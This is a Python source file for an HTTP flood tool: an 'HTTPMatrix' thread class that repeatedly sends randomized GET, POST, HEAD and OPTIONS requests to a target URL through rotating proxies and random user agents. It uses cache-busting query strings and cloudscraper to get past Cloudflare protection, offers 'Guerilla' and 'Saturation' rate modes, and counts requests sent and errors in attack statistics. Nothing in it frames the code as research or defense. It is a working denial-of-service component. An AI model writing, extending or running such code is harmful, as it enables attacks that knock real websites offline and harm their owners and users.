# -*- coding: utf-8 -*-
import threading
import random
import time
from urllib.parse import urlparse

import cloudscraper
import requests

import config
from utils.network import get_random_proxy, get_random_user_agent

class HTTPMatrix(threading.Thread):
    def __init__(self, target_url, mode):
        super().__init__()
        self.daemon = True
        self.target_url = target_url
        self.mode = mode
        self.scraper = cloudscraper.create_scraper()
        self.parsed_target = urlparse(target_url)

    def get_attack_params(self):
        delay = 0
        if self.mode == "Guerilla":
            delay = random.uniform(0.8, 2.5)
        elif self.mode == "Saturation":
            delay = random.uniform(0, 0.2)
        return delay

    def build_headers(self):
        return {
            'User-Agent': get_random_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
        }

    def run(self):
        config.attack_stats["active_threads"] += 1
        delay = self.get_attack_params()
        
        while not config.stop_event.is_set():
            proxy = get_random_proxy()
            headers = self.build_headers()
            url_with_cache_bust = f"{self.target_url}?_={random.randint(1, 1e12)}"

            try:
                method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
                
                if method == 'GET':
                    response = self.scraper.get(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                elif method == 'POST':
                    payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(32))
                    response = self.scraper.post(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT, data={"data": payload})
                else:
                    response = self.scraper.request(method, url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                
                config.attack_stats["requests_sent"] += 1
                if 200 <= response.status_code < 400:
                    config.attack_stats["http_ok"] += 1
                else:
                    config.attack_stats["http_error"] += 1
                
                request_size = len(response.request.method) + len(response.request.url) + len('\r\n'.join(f'{k}: {v}' for k, v in response.request.headers.items()))
                config.attack_stats["bytes_sent"] += request_size

            except requests.exceptions.Timeout:
                config.attack_stats["timeout_error"] += 1
            except requests.exceptions.ConnectionError:
                config.attack_stats["connect_error"] += 1
            except Exception:
                config.attack_stats["connect_error"] += 1
            
            if delay > 0:
                time.sleep(delay)
        
        config.attack_stats["active_threads"] -= 1

